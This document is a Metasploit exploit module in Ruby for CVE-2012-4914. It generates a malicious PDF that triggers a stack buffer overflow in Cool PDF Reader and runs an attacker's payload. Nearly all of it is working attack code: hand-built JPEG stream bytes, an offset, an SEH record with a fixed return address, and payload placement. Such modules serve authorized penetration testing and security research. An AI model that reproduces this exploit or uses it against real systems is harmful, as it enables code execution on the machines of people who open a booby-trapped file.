##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::PDF
  include Msf::Exploit::Remote::Seh

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Cool PDF Image Stream Buffer Overflow',
      'Description'    => %q{
          This module exploits a stack buffer overflow in Cool PDF Reader prior to version
        3.0.2.256. The vulnerability is triggered when opening a malformed PDF file that
        contains a specially crafted image stream. This module has been tested successfully
        on Cool PDF 3.0.2.256 over Windows XP SP3 and Windows 7 SP1.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Francis Provencher', # Vulnerability discovery
          'Chris Gabriel', # Proof of concept
          'juan vazquez' # Metasploit module
        ],
      'References'     =>
        [
          [ 'CVE', '2012-4914' ],
          [ 'OSVDB', '89349' ],
          [ 'EDB', '24463' ],
          [ 'URL', 'http://www.protekresearchlab.com/index.php?option=com_content&view=article&id=70&Itemid=70' ]
        ],
      'Payload'        =>
        {
          'Space'       => 2000,
          'DisableNops' => true
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'Cool PDF 3.0.2.256 / Windows 7 SP1 / Windows XP SP3',
            {
              'Offset' => 433,
              'Ret' => 0x00539fa4 # ppr from coolpdf.exe
            }
          ]
        ],
      'DisclosureDate' => 'Jan 18 2013',
      'DefaultTarget'  => 0))

    register_options(
      [
        OptString.new('FILENAME', [ false, 'The output filename.', 'msf.pdf'])
      ], self.class)
  end

  def exploit
    file_create(make_pdf)
  end

  def jpeg
    p = payload.encoded
    sploit =  "\xFF\xD8\xFF\xEE\x00\x0E\x41\x64" + "\x6F\x62\x65\x00\x64\x80\x00\x00"
    sploit << "\x00\x02\xFF\xDB\x00\x84\x00\x02" + "\x02\x02\x02\x02\x02\x02\x02\x02"
    sploit << "\x02\x03\x02\x02\x02\x03\x04\x03" + "\x03\x03\x03\x04\x05\x04\x04\x04"
    sploit << "\x04\x04\x05\x05\x05\x05\x05\x05" + "\x05\x05\x05\x05\x07\x08\x08\x08"
    sploit << "\x07\x05\x09\x0A\x0A\x0A\x0A\x09" + "\x0C\x0C\x0C\x0C\x0C\x0C\x0C\x0C"
    sploit << "\x0C\x0C\x0C\x0C\x0C\x0C\x0C\x01" + "\x03\x02\x02\x03\x03\x03\x07\x05"
    sploit << "\x05\x07\x0D\x0A\x09\x0A\x0D\x0F" + "\x0D\x0D\x0D\x0D\x0F\x0F\x0C\x0C"
    sploit << "\x0C\x0C\x0C\x0F\x0F\x0C\x0C\x0C" + "\x0C\x0C\x0C\x0F\x0C\x0E\x0E\x0E"
    sploit << "\x0E\x0E\x0C\x11\x11\x11\x11\x11" + "\x11\x11\x11\x11\x11\x11\x11\x11"
    sploit << "\x11\x11\x11\x11\x11\x11\x11\x11" + "\xFF\xC0\x00\x14\x08\x00\x32\x00"
    sploit << "\xE6\x04\x01\x11\x00\x02\x11\x01" + "\x03\x11\x01\x04\x11\x00\xFF\xC4"
    sploit << "\x01\xA2\x00\x00\x00\x07\x01\x01" + "\x01\x01\x01\x00\x00\x00\x00\x00"
    sploit << "\x00\x00\x00\x04\x05\x03\x02\x06" + "\x01\x00\x07\x08\x09\x0A\x0B\x01"
    sploit << "\x54\x02\x02\x03\x01\x01\x01\x01" + "\x01\x00\x00\x00\x00\x00\x00\x00"
    sploit << "\x01\x00\x02\x03\x04\x05\x06\x07"
    sploit << rand_text(target['Offset'])
    sploit << generate_seh_record(target.ret)
    sploit << p
    sploit << rand_text(2388 - p.length)
    return sploit
  end

  # Override the mixin obfuscator since it doesn't seem to work here.
  def nObfu(str)
    return str
  end

  def make_pdf
    @pdf << header
    add_object(1, nObfu("<</Type/Catalog/Outlines 2 0 R /Pages 3 0 R>>"))
    add_object(2, nObfu("<</Type/Outlines>>"))
    add_object(3, nObfu("<</Type/Pages/Kids[5 0 R]/Count 1/Resources <</ProcSet 4 0 R/XObject <</I0 7 0 R>>>>/MediaBox[0 0 612.0 792.0]>>"))
    add_object(4, nObfu("[/PDF/Text/ImageC]"))
    add_object(5, nObfu("<</Type/Page/Parent 3 0 R/Contents 6 0 R>>"))
    stream_1 = "stream" << eol
    stream_1 << "0.000 0.000 0.000 rg 0.000 0.000 0.000 RG q 265.000 0 0 229.000 41.000 522.000 cm /I0 Do Q" << eol
    stream_1 << "endstream" << eol
    add_object(6, nObfu("<</Length 91>>#{stream_1}"))
    stream = "<<" << eol
    stream << "/Width 230" << eol
    stream << "/BitsPerComponent 8" << eol
    stream << "/Name /X" << eol
    stream << "/Height 50" << eol
    stream << "/Intent /RelativeColorimetric" << eol
    stream << "/Subtype /Image" << eol
    stream << "/Filter /DCTDecode" << eol
    stream << "/Length #{jpeg.length}" << eol
    stream << "/ColorSpace /DeviceCMYK" << eol
    stream << "/Type /XObject" << eol
    stream << ">>"
    stream << "stream" << eol
    stream << jpeg << eol
    stream << "endstream" << eol
    add_object(7, stream)
    finish_pdf
  end

end
